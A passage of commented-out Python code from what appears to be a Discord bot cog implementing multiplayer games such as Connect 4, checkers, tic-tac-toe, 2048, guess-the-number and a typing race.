#                 await msg1.add_reaction(i)
#         except discord.Forbidden:
#             return await ctx.send(f"I couldnt dm {ctx.author.display_name}")
#         try:
#             msg2 = await member.send("Please react with your choice:")
#             for i in ["✂️", "🪨", "📜"]:
#                 await msg2.add_reaction(i)
#         except discord.Forbidden:
#             return await ctx.send(f"I couldnt dm {member.display_name}")

#         def check(payload):
#             return (
#                 payload.message_id in [msg1.id, msg2.id]
#                 and str(payload.emoji) in ["✂️", "🪨", "📜"]
#                 and payload.user_id != self.bot.user.id
#             )
#         try:
#             payload = await self.bot.wait_for("raw_reaction_add", check=check, timeout=45)
#         except asyncio.TimeoutError:
#             del self.dct[member]
#             del self.dct[ctx.author]
#             return await ctx.send("Game timed out")
#         if payload.user_id == ctx.author.id:
#             await ctx.send(f"Waiting for {member.display_name}")
#             try:
#                 payload2 = await self.bot.wait_for(
#                     "raw_reaction_add",
#                     check=lambda p: p.message_id == msg2.id
#                     and str(payload.emoji) in ["✂️", "🪨", "📜"],
#                 )
#             except asyncio.TimeoutError:
#                 await ctx.send(f"{member.display_name} took too long to respond")
#                 await self.end_game(ctx, ctx.author, member)
#             win = self.has_won_rps(str(payload.emoji), str(payload2.emoji))
#             await ctx.send(
#                 f"{member.display_name}: {str(payload2.emoji)}\n{ctx.author.display_name}: {str(payload.emoji)}\nWinner: {'Draw' if win == 'Draw' else (ctx.author.mention if win == 'inp1' else member.mention)}"
#             )
#             if win == 'Draw':
#                 return
#             await self.end_game(ctx, ctx.author if win == 'inp1' else member, member if win == 'inp1' else ctx.author)
#         else:
#             await ctx.send(f"Waiting for {ctx.author.display_name}")
#             try:
#                 payload2 = await self.bot.wait_for(
#                     "raw_reaction_add",
#                     check=lambda p: p.message_id == msg1.id
#                     and str(payload.emoji) in ["✂️", "🪨", "📜"],
#                 )
#             except asyncio.TimeoutError:
#                 await ctx.send(f"{ctx.author.display_name} took too long to respond")
#                 await self.end_game(ctx, member, ctx.author)
#             win = self.has_won_rps(str(payload2.emoji), str(payload.emoji))
#             await ctx.send(
#                 f"{member.display_name}: {str(payload.emoji)}\n{ctx.author.display_name}: {str(payload2.emoji)}\nWinner: {'Draw' if win == 'Draw' else (ctx.author.mention if win == 'inp1' else member.mention)}"
#             )
#             await self.end_game(ctx, ctx.author if win == 'inp1' else member, member if win == 'inp1' else ctx.author)


#   def format_connect4_board(self, board):
#       """Format the minesweeper board"""
#       toDisplay = ""
#       dct = {"b": "🔵", "r": "🔴", " ": "⬛", "R": "♦️", "B": "🔷"}
#       for y in range(6):
#           for x in range(6):
#               toDisplay += dct[board[y][x]]
#           toDisplay += dct[board[y][6]] + "\n"
#       toDisplay += "1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣"
#       return toDisplay

#   def has_won_connect4(self, board, is_bot=False):
#       """Checks if game is over"""
#       height = 6
#       width = 7
#       for x in range(height):
#           for y in range(width - 3):
#               if (
#                   board[x][y] == board[x][y + 1]
#                   and board[x][y] == board[x][y + 2]
#                   and board[x][y] == board[x][y + 3]
#                   and board[x][y] != " "
#               ):
#                   if not is_bot:
#                       if board[x][y] == "b":
#                           board[x][y] = "B"
#                           board[x][y + 1] = "B"
#                           board[x][y + 2] = "B"
#                           board[x][y + 3] = "B"
#                       elif board[x][y] == "r":
#                           board[x][y] = "R"
#                           board[x][y + 1] = "R"
#                           board[x][y + 2] = "R"
#                           board[x][y + 3] = "R"
#                   return True, board, "in a horizontal row", board[x][y].lower()
#       for x in range(height - 3):
#           for y in range(width):
#               if (
#                   board[x][y] == board[x + 1][y]
#                   and board[x][y] == board[x + 2][y]
#                   and board[x][y] == board[x + 3][y]
#                   and board[x][y] != " "
#               ):
#                   if not is_bot:
#                       if board[x][y] == "b":
#                           board[x][y] = "B"
#                           board[x + 1][y] = "B"
#                           board[x + 2][y] = "B"
#                           board[x + 3][y] = "B"
#                       elif board[x][y] == "r":
#                           board[x][y] = "R"
#                           board[x + 1][y] = "R"
#                           board[x + 2][y] = "R"
#                           board[x + 3][y] = "R"
#                   return True, board, "in a vertical row", board[x][y].lower()
#       for x in range(height - 3):
#           for y in range(width - 3):
#               if (
#                   board[x][y] == board[x + 1][y + 1]
#                   and board[x][y] == board[x + 2][y + 2]
#                   and board[x][y] == board[x + 3][y + 3]
#                   and board[x][y] != " "
#               ):
#                   if not is_bot:
#                       if board[x][y] == "b":
#                           board[x][y] = "B"
#                           board[x + 1][y + 1] = "B"
#                           board[x + 2][y + 2] = "B"
#                           board[x + 3][y + 3] = "B"
#                       elif board[x][y] == "r":
#                           board[x][y] = "R"
#                           board[x + 1][y + 1] = "R"
#                           board[x + 2][y + 2] = "R"
#                           board[x + 3][y + 3] = "R"
#                   return True, board, "on a \ diagonal", board[x][y].lower()
#       for x in range(height - 3):
#           for y in range(3, width):
#               if (
#                   board[x][y] == board[x + 1][y - 1]
#                   and board[x][y] == board[x + 2][y - 2]
#                   and board[x][y] == board[x + 3][y - 3]
#                   and board[x][y] != " "
#               ):
#                   if not is_bot:
#                       if board[x][y] == "b":
#                           board[x][y] = "B"
#                           board[x + 1][y - 1] = "B"
#                           board[x + 2][y - 2] = "B"
#                           board[x + 3][y - 3] = "B"
#                       elif board[x][y] == "r":
#                           board[x][y] = "R"
#                           board[x + 1][y - 1] = "R"
#                           board[x + 2][y - 2] = "R"
#                           board[x + 3][y - 3] = "R"
#                   return True, board, "in a / diagonal", board[x][y].lower()
#       num = 0
#       for row in board:
#           for column in row:
#               if column != " ":
#                   num += 1
#       if num == (len(board) * len(board[0])):
#           return False, board, "Tie"
#       return None, None, None

#   @commands.command()
#   async def connect4(self, ctx, member: discord.Member):
#       """a two-player connection board game, in which the players take turns dropping colored discs into a seven-column, six-row vertically suspended grid."""
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       else:
#           if self.player_ingame(ctx.author):
#               return await ctx.send("You're already in a game")
#           if self.player_ingame(member):
#               return await ctx.send(f"{member.display_name} is already in a game")
#           await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#           msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#           if msg.content.lower() == 'no':
#               return
#           self.dct[member] = True
#           self.dct[ctx.author] = True
#           board = [[" " for _ in range(7)] for i in range(6)]
#           turn = ctx.author
#           e = discord.Embed(
#               title="Connect4",
#               description=f"How to play: type a number 1-7 to drop a token inside that column\nturn: `{turn.display_name}`\n\n{self.format_connect4_board(board)}",
#               color=discord.Color.blurple(),
#           ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#           msg = await ctx.send(embed=e)
#           while True:
#               e = discord.Embed(
#                   title="Connect4",
#                   description=f"How to play: type a number 1-7 to drop a token inside that column\nturn: `{turn.display_name}`\n\n{self.format_connect4_board(board)}",
#                   color=discord.Color.blurple(),
#               ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#               await msg.edit(embed=e)
#               try:
#                   inp = await self.bot.wait_for(
#                       "message",
#                       check=lambda m: m.author in [member, ctx.author] and m.channel == ctx.channel,
#                       timeout=45
#                   )
#               except asyncio.TimeoutError:
#                   return await ctx.send('TImed out')
#               if inp.content.lower() in ["stop", "end", "cancel"]:
#                   await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#                   return await ctx.send("Ended the game")
#               elif inp.content.lower() in ['re','re-send','resend']:
#                   msg = await ctx.send(embed=e)
#                   continue
#               if inp.author != turn:
#                   continue
#               if not len(inp.content) == 1:
#                   continue
#               try:
#                   x = int(inp.content) - 1
#               except ValueError:
#                   await ctx.send(f"Invalid Syntax: {inp.content} is not a number")
#                   continue
#               if x not in range(7):
#                   await ctx.send(
#                       f"Invalid syntax: {inp.content} isnt a valid place on the board"
#                   )
#                   continue
#               y = 0
#               while y <= 6:
#                   if y == 6:
#                       await ctx.send(
#                           "Invalid Syntax: Cant add to this column anymore"
#                       )
#                       break
#                   if board[5 - y][x] == " ":
#                       board[5 - y][x] = "r" if turn == ctx.author else "b"
#                       break
#                   else:
#                       y += 1
#               won = self.has_won_connect4(board)
#               if won[0]:
#                   await ctx.send(f"{turn.mention} connected 4 {won[2]}")
#                   e = discord.Embed(
#                       title="Connect4",
#                       description=self.format_connect4_board(won[1]),
#                       color=discord.Color.blurple(),
#                   )
#                   await self.end_game(ctx, turn, member if turn ==  ctx.author else ctx.author)
#                   return await ctx.send(embed=e)
#               elif won[0] == False:
#                   await ctx.send("Tie")
#                   e = discord.Embed(
#                       title="Connect4",
#                       description=self.format_connect4_board(won[1]),
#                       color=discord.Color.blurple(),
#                   )
#                   self.dct[member] = False
#                   self.dct[ctx.author] = False
#                   return await ctx.send(embed=e)
#               turn = member if turn == ctx.author else ctx.author

#   def format_checkers_board(self, board):
#       """Format the minesweeper board"""
#       dct = {"r": "🔴", "b": "🔵", " ": "⬛", "rk": "♦", "bk": "🔷"}
#       for i in range(1, 10):
#           dct[str(i)] = f"{i}\N{variation selector-16}\N{combining enclosing keycap}"
#       lst = ["⏹️" + "".join([dct[str(i + 1)] for i in range(len(board[0]))])]
#       for x, row in enumerate(board):
#           scn_lst = [dct[str(x + 1)]]
#           for y, column in enumerate(row):
#               scn_lst.append(dct[column])
#           lst.append("".join(scn_lst))
#       return "\n".join(lst)

#   def has_won_checkers(self, board):
#       """Checks if the game is over"""
#       nos = {" ": 0, "r": 0, "b": 0}
#       for i in board:
#           for m in i:
#               nos[m[0]] += 1
#       if nos["b"] == 0:
#           return "r"
#       elif nos["r"] == 0:
#           return "b"

#   @commands.command()
#   async def checkers(self, ctx, member: discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       board = [
#           [" ", "b", " ", "b", " ", "b", " ", "b"],
#           ["b", " ", "b", " ", "b", " ", "b", " "],
#           [" ", "b", " ", "b", " ", "b", " ", "b"],
#           [" ", " ", " ", " ", " ", " ", " ", " "],
#           [" ", " ", " ", " ", " ", " ", " ", " "],
#           ["r", " ", "r", " ", "r", " ", "r", " "],
#           [" ", "r", " ", "r", " ", "r", " ", "r"],
#           ["r", " ", "r", " ", "r", " ", "r", " "],
#       ]
#       turn = "r"
#       e = discord.Embed(
#           title="Checkers",
#           description=f"How to play: send the coordinates of the piece you want to move and the direction where it moves in this format `[x][y] [direction]`, eg: `61 ur`\n\nTurn: `{ctx.author.display_name if turn == 'r' else member.display_name}`\n{self.format_checkers_board(board)}",
#           color=discord.Color.blurple(),
#       ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#       msg = await ctx.send(embed=e)
#       opts = {"ul": 1, "ur": 2, "dl": 3, "dr": 4}
#       while True:
#           e = discord.Embed(
#               title="Checkers",
#               description=f"How to play: send the coordinates of the piece you want to move and the direction where it moves in this format `[x][y] [direction]`, eg: `61 ur`\n\nTurn: `{ctx.author.display_name if turn == 'r' else member.display_name}`\n```\n{self.format_checkers_board(board)}\n```",
#               color=discord.Color.blurple(),
#           ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#           await msg.edit(embed=e)
#           try:
#               inp = await self.bot.wait_for(
#                   "message",
#                   check=lambda m: m.author in [member, ctx.author]
#                   and m.channel == ctx.channel,
#                   timeout=45
#               )
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           if inp.content.lower() in ["end", "stop", "cancel"]:
#               await ctx.send("Ended the game")
#               await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#               return
#           elif inp.content.lower() in ['re','re-send','resend']:
#               msg = await ctx.send(embed=e)
#               continue
#           if inp.author != (ctx.author if turn == 'r' else member):
#               continue
#           try:
#               coors, direction = inp.content.split(" ")[0], inp.content.split(" ")[1]
#           except Exception:
#               await ctx.send(
#                   "Invalid syntax: to play your turn select a token and the direction where it goes, eg: `22 dr`",
#                   delete_after=5,
#               )
#               continue
#           if direction not in opts:
#               await ctx.send(
#                   f"Invalid syntax: Correct directions ul (up left), dl (down left), ur (up right), dr (down right)",
#                   delete_after=5,
#               )
#               continue
#           elif not len(coors) == 2:
#               await ctx.send(
#                   f"Invalid syntax: The coordinates entered are invalid",
#                   delete_after=5,
#               )
#               continue
#           try:
#               await inp.delete()
#           except discord.Forbidden:
#               pass
#           direction = opts[direction]
#           if direction == 1:
#               inc = (-1, -1)
#           if direction == 2:
#               inc = (1, -1)
#           if direction == 3:
#               inc = (-1, 1)
#           if direction == 4:
#               inc = (1, 1)
#           try:
#               x, y = int(coors[0]) - 1, int(coors[1]) - 1
#           except (IndexError, ValueError):
#               await ctx.send(
#                   "Invalid syntax: The coordinates entered are invalid",
#                   delete_after=5,
#               )
#               continue
#           else:
#               if x not in range(8) or y not in range(8):
#                   await ctx.send(
#                       f"Invalid syntax: {x+1}{y+1} isnt a valid place on the board",
#                       delete_after=5,
#                   )
#           if board[x][y] not in [turn, turn + "k"]:
#               await ctx.send("Thats not your token", delete_after=5)
#               continue
#           if board[x][y] == turn + "k":
#               try:
#                   if board[x + inc[1]][y + inc[0]] == " ":
#                       if y + inc[0] < 0:
#                           await ctx.send("Cant go in that direction", delete_after=5)
#                           continue
#                       board[x][y] = " "
#                       board[x + inc[1]][y + inc[0]] = turn + "k"
#                   else:
#                       if board[x + inc[1] * 2][y + inc[0] * 2] != " ":
#                           await ctx.send("Cant do that jump", delete_after=5)
#                           continue
#                       board[x][y] = " "
#                       board[x + inc[1]][y + inc[0]] = " "
#                       board[x + inc[1] * 2][y + inc[0] * 2] = turn + "k"
#               except IndexError:
#                   await ctx.send("Cant go in that direction", delete_after=5)
#                   continue
#           else:
#               if (
#                   board[x][y] == "r"
#                   and direction in [3, 4]
#                   or board[x][y] == "b"
#                   and direction in [1, 2]
#               ):
#                   await ctx.send("invalid direction", delete_after=5)
#                   continue
#               if board[x][y] == turn:
#                   try:
#                       if board[x + inc[1]][y + inc[0]] == " ":
#                           if y + inc[0] < 0:
#                               await ctx.send(
#                                   "Cant go in that direction", delete_after=5
#                               )
#                               continue
#                           board[x][y] = " "
#                           board[x + inc[1]][y + inc[0]] = turn
#                           if turn == "r" and x + inc[1] == 0:
#                               board[x + inc[1]][y + inc[0]] = turn + "k"
#                           elif turn == "b" and x + inc[1] == 7:
#                               board[x + inc[1]][y + inc[0]] = turn + "k"
#                       elif board[x + inc[1]][y + inc[0]] in [turn, turn + "k"]:
#                           await ctx.send("Cant move there", delete_after=5)
#                           continue
#                       else:
#                           if board[x + inc[1] * 2][y + inc[0] * 2] != " ":
#                               await ctx.send("Cant do that jump")
#                               continue
#                           board[x][y] = " "
#                           board[x + inc[1]][y + inc[0]] = " "
#                           board[x + inc[1] * 2][y + inc[0] * 2] = turn
#                           if turn == "r" and x + inc[1] * 2 == 0:
#                               board[x + inc[1] * 2][y + inc[0] * 2] = turn + "k"
#                           elif turn == "b" and x + inc[1] * 2 == 7:
#                               board[x + inc[1] * 2][y + inc[0] * 2] = turn + "k"
#                   except IndexError:
#                       await ctx.send("Cant move there", delete_after=5)
#                       continue
#           if self.has_won_checkers(board):
#               await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)
#               e = discord.Embed(
#                   title="Checkers",
#                   description=f"Winner: {ctx.author.mention if self.has_won_checkers(board) == 'r' else member.mention}\n{self.format_checkers_board(board)}",
#                   color=discord.Color.blurple(),
#               )
#               return await ctx.send(embed=e)
#           turn = "r" if turn == "b" else "b"

#   def format_ttt_board(self, board):
#       """Format the ttt board"""
#       lst = ["  1 2 3"]
#       for x, row in enumerate(board, start=1):
#           lst.append("".join([str(x) + "|" + "|".join(row)]))
#       return "\n".join(lst)

#   def make_ttt_move(self, move, board, turn):
#       """Checks if `move` is a valid move or not"""
#       if move not in [
#           "11",
#           "12",
#           "13",
#           "21",
#           "22",
#           "23",
#           "31",
#           "32",
#           "33",
#       ]:
#           return (
#               False,
#               f"Invalid Syntax: {move} isn't a valid place on the board, Please try again",
#           )
#       else:
#           if board[int(move[0]) - 1][int(move[1]) - 1] != " ":
#               return (
#                   False,
#                   f"Invalid Syntax: {move} has already been chosen, Please try again",
#               )
#           else:
#               board[int(move[0]) - 1][int(move[1]) - 1] = turn
#               return True, board

#   def has_won_ttt(self, board):
#       """Checks if someone won, returns True and the winner if someone won, returns False and "tie" if it was a tie"""
#       BLANK = " "
#       for i in range(3):

#           if (board[i][0] == board[i][1] == board[i][2]) and board[i][0] != BLANK:
#               return (True, board[i][0])
#           if (board[0][i] == board[1][i] == board[2][i]) and board[0][i] != BLANK:
#               return (True, board[0][i])

#       if (board[0][0] == board[1][1] == board[2][2]) and board[0][0] != BLANK:
#           return (True, board[0][0])

#       if (board[0][2] == board[1][1] == board[2][0]) and board[0][2] != BLANK:
#           return (True, board[0][2])
#       if sum([i.count(BLANK) for i in board]) == 0:
#           return (False, "tie")
#       return (None, None)

#   @commands.command(aliases=["ttt"])
#   async def tictactoe(self, ctx: commands.Context, member: discord.Member):
#       """two players take turns marking the spaces in a three-by-three grid with X or O. The player who succeeds in placing three of their marks in a horizontal, vertical, or diagonal row is the winner"""
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       else:
#           if self.player_ingame(ctx.author):
#               return await ctx.send("You're already in a game")
#           if self.player_ingame(member):
#               return await ctx.send(f"{member.display_name} is already in a game")
#           await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#           msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#           if msg.content.lower() == 'no':
#               return
#           self.dct[member] = True
#           self.dct[ctx.author] = True
#           turn = ctx.author
#           board = [[" " for i in range(3)] for i in range(3)]
#           embed = discord.Embed(
#               title="TicTacToe",
#               description=f"How to play: send the coordinates of where you want to place your token, eg: `22`\n\nturn: `{turn.display_name}`\n```\n{self.format_ttt_board(board)}\n```",
#               color=discord.Color.blurple(),
#           ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game')
#           msg = await ctx.send(embed=embed)
#           while True:
#               try:
#                   inp = await self.bot.wait_for(
#                       "message",
#                       check=lambda m: m.author in [member, ctx.author] and m.channel == ctx.channel,
#                       timeout=45
#                   )
#               except asyncio.TimeoutError:
#                   return await ctx.send('Timed out')
#               if inp.content in ["cancel", "end", "stop"]:
#                   await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#                   return await ctx.send("Cancelled the game")
#               if inp.author != turn:
#                   continue
#               outp = self.make_ttt_move(
#                   inp.content, board, "x" if turn == ctx.author else "o"
#               )
#               if outp[0]:
#                   board = outp[1]
#               else:
#                   await ctx.send(outp[1])
#                   continue
#               h = self.has_won_ttt(board)
#               if h[0]:
#                   await self.end_game(ctx, turn, member if turn == ctx.author else ctx.author)
#                   return await ctx.send(
#                       embed=discord.Embed(
#                           title="TicTacToe",
#                           color=discord.Color.blurple(),
#                           description=(
#                               "winner: `"
#                               f"{turn.display_name}`"
#                               "\n"
#                               f"```\n{self.format_ttt_board(board)}```"
#                               "\n"
#                           ),
#                       ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game')
#                   )
#               elif h[0] == False:
#                   self.dct[turn] = False
#                   self.dct[member if turn == ctx.author else ctx.author] = False
#                   return await ctx.send(
#                       embed=discord.Embed(
#                           title="TicTacToe",
#                           color=discord.Color.blurple(),
#                           description=(
#                               "winner: `"
#                               f"Tie`"
#                               "\n"
#                               f"```\n{self.format_ttt_board(board)}```"
#                               "\n"
#                           ),
#                       ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game')
#                   )
#               turn = member if turn == ctx.author else ctx.author
#               await msg.edit(
#                   embed=discord.Embed(
#                       title="TicTacToe",
#                       description=f"How to play: send the coordinates of where you want to place your token, eg: `22`\n\nturn: `{turn.display_name}`\n```\n{self.format_ttt_board(board)}\n```",
#                       color=discord.Color.blurple(),
#                   ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game')
#               )


#   def format_2048_board(self, board):
#       """Format the 2048 board"""
#       h = []
#       for row in board:
#           h.append("".join(str(row)))
#       h = "\n".join(h)
#       return f"```\n{h}\n```"

#   def go_up(self, board):
#       """Move all the numbers on the board upwards"""
#       moved = False
#       for x in range(0, 4):
#           for y in range(0, 4):
#               if board[y][x] != 0 and y < 3:
#                   for yprime in range(y + 1, 4):
#                       if board[yprime][x] != 0:
#                           if board[yprime][x] == board[y][x]:
#                               board[y][x] = 2 * board[y][x]
#                               moved = True
#                               board[yprime][x] = 0
#                               break
#                           else:
#                               break
#           for y in range(0, 4):
#               if board[y][x] == 0 and y < 3:
#                   for yprime in range(y + 1, 4):
#                       if board[yprime][x] != 0:
#                           board[y][x] = board[yprime][x]
#                           board[yprime][x] = 0
#                           moved = True
#                           break
#       return moved, board

#   def go_down(self, board):
#       """Move all the numbers on the board downwards"""
#       moved = False
#       for x in range(0, 4):
#           for y in range(3, -1, -1):
#               if board[y][x] != 0 and y > 0:
#                   for yprime in range(y - 1, -1, -1):
#                       if board[yprime][x] != 0:
#                           if board[yprime][x] == board[y][x]:
#                               board[y][x] = board[y][x] * 2
#                               moved = True
#                               board[yprime][x] = 0
#                               break
#                           else:
#                               break
#           for y in range(3, -1, -1):
#               if board[y][x] == 0 and y > 0:
#                   for yprime in range(y - 1, -1, -1):
#                       if board[yprime][x] != 0:
#                           board[y][x] = board[yprime][x]
#                           board[yprime][x] = 0
#                           moved = True
#                           break
#       return moved, board

#   def go_right(self, board):
#       """Move all the numbers on the board right"""
#       moved = False
#       for y in range(0, 4):
#           for x in range(3, -1, -1):
#               if board[y][x] != 0 and x > 0:
#                   for xprime in range(x - 1, -1, -1):
#                       if board[y][xprime] != 0:
#                           if board[y][xprime] == board[y][x]:
#                               board[y][x] = 2 * board[y][x]
#                               moved = True
#                               board[y][xprime] = 0
#                               break
#                           else:
#                               break
#           for x in range(3, -1, -1):
#               if board[y][x] == 0 and x > 0:
#                   for xprime in range(x - 1, -1, -1):
#                       if board[y][xprime] != 0:
#                           board[y][x] = board[y][xprime]
#                           board[y][xprime] = 0
#                           moved = True
#                           break
#       return moved, board

#   def go_left(self, board):
#       """Move all the numbers on the board left"""
#       moved = False
#       for y in range(0, 4):
#           for x in range(0, 4):
#               if board[y][x] != 0 and x < 3:
#                   for xprime in range(x + 1, 4):
#                       if board[y][xprime] != 0:
#                           if board[y][x] == board[y][xprime]:
#                               board[y][x] = 2 * board[y][x]
#                               moved = True
#                               board[y][xprime] = 0
#                               break
#                           else:
#                               break
#           for x in range(0, 4):
#               if board[y][x] == 0 and x < 3:
#                   for xprime in range(x + 1, 4):
#                       if board[y][xprime] != 0:
#                           board[y][x] = board[y][xprime]
#                           board[y][xprime] = 0
#                           moved = True
#                           break
#       return moved, board

#   def add_number(self, board):
#       """Add either a 2 or 4 onto the board"""

#       while True:
#           x = random.randint(0, 3)
#           y = random.randint(0, 3)

#           pickanumber = random.randint(0, 9)
#           if pickanumber < 1:
#               num = 4
#           else:
#               num = 2

#           if board[x][y] == 0:
#               board[x][y] = num
#               break
#       return board

#   def get_result(self, board):
#       """Check if the game is over"""
#       zeroes = 0
#       playsleft = False
#       for x in range(len(board)):
#           for y in range(len(board[x])):
#               if board[x][y] == 2048:
#                   return True
#       for y in range(0, 4):
#           zeroes += board[y].count(0)
#           if zeroes > 0:
#               break
#           for x in range(0, 4):
#               if x < 3 and board[y][x + 1] == board[y][x]:
#                   playsleft = True
#                   break
#               if y < 3 and board[y + 1][x] == board[y][x]:
#                   playsleft = True
#                   break
#           if playsleft == True:
#               break

#       if zeroes == 0 and playsleft == False:
#           return False

#   def create_2048_board(self):
#       b = [[0 for _ in range(4)] for _ in range(4)]
#       b = self.add_number(b)
#       b = self.add_number(b)
#       return b

#   @commands.command("2048")
#   async def _2048_(self, ctx):
#       """you combine like-numbered tiles numbered with powers of two until you get a tile with the value of 2048. Gameplay consists of swiping the tiles up, right, down and left, and any tiles that match in the direction and adjacent spot will combine in the direction swiped."""
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       self.dct[ctx.author] = True
#       b = self.create_2048_board()
#       e = discord.Embed(
#           title="2048",
#           description=self.format_2048_board(b),
#           color=discord.Color.blurple(),
#       ).set_footer(text='React with "⏹️" to end the game')
#       msg = await ctx.send(embed=e)
#       for emoji in ["➡️", "⬆️", "⏹️", "⬇️", "⬅️"]:
#           await msg.add_reaction(emoji)
#       while True:
#           e = discord.Embed(
#               title="2048",
#               description=self.format_2048_board(b),
#               color=discord.Color.blurple(),
#           ).set_footer(text='React with "⏹️" to end the game')
#           await msg.edit(embed=e)
#           try:
#               reaction, user = await self.bot.wait_for(
#                   "reaction_add",
#                   check=lambda r, u: u == ctx.author
#                   and r.message == msg
#                   and str(r) in ["⬆️", "➡️", "⏹️", "⬅️", "⬇️"],
#               )
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           try:
#               await msg.remove_reaction(str(reaction), user)
#           except discord.Forbidden:
#               pass
#           if str(reaction) == "⏹️":
#               await ctx.send("Game ended")
#               return
#           elif str(reaction) == "⬆️":
#               ans, b = self.go_up(b)
#           elif str(reaction) == "⬇️":
#               ans, b = self.go_down(b)
#           elif str(reaction) == "➡️":
#               ans, b = self.go_right(b)
#           elif str(reaction) == "⬅️":
#               ans, b = self.go_left(b)
#           if ans:
#               b = self.add_number(b)
#           res = self.get_result(b)
#           if res:
#               e = discord.Embed(
#                   title="2048",
#                   description=self.format_2048_board(b),
#                   color=discord.Color.blurple(),
#               )
#               await msg.edit(content="You won!!!", embed=e)
#               return
#           elif res == False:
#               e = discord.Embed(
#                   title="2048",
#                   description=self.format_2048_board(b),
#                   color=discord.Color.blurple(),
#               )
#               await msg.edit(content="You lost", embed=e)
#               return

#   @commands.command()
#   async def guessthenumber(self, ctx, member:discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       num = random.randint(0, 999)
#       lnum = num-random.randint(0, 120)
#       bnum = num+random.randint(0, 120)
#       await ctx.send(f'Starting | Guess the Number\nI have generated a number between {lnum if lnum > 0 else 0} - {bnum if bnum < 999 else 999}')
#       while True:
#           await ctx.send('Guess the Number!', delete_after=5)
#           try:
#               inp = await self.bot.wait_for('message', check=lambda m: m.author in (ctx.author, member) and m.channel == ctx.channel and (m.content.isdecimal() or m.content in ['end','cancel','stop']), timeout=45)
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           if inp.content in ['end','cancel','stop']:
#               await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#               return await ctx.send("Cancelled the game")
#           if int(inp.content) == num:
#               return await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)

#   @commands.command()
#   async def typerace(self, ctx, member:discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       async with aiohttp.ClientSession() as cs:
#           async with cs.get('https://random-word-api.herokuapp.com/word?number=3') as r:
#               words = await r.json()
#               word_ = ' '.join(words)
#               word = self.to_emoji(word_)
#               await ctx.send(word)
#               while True:
#                   try:
#                       inp = await self.bot.wait_for('message', check= lambda m: m.content.lower() == word_.lower() and m.author in (ctx.author, member) and m.channel == ctx.channel)
#                   except asyncio.TimeoutError:
#                       return await ctx.send("Timed out")
#                   if inp.content in ['end','cancel','stop']:
#                       await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#                       return await ctx.send("Cancelled the game")
#                   return await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)

#   @commands.command()
#   async def memory(self, ctx, member:discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       conversion = {'up':'🔼', 'left':'◀', 'right':'▶', 'down':'🔽'}
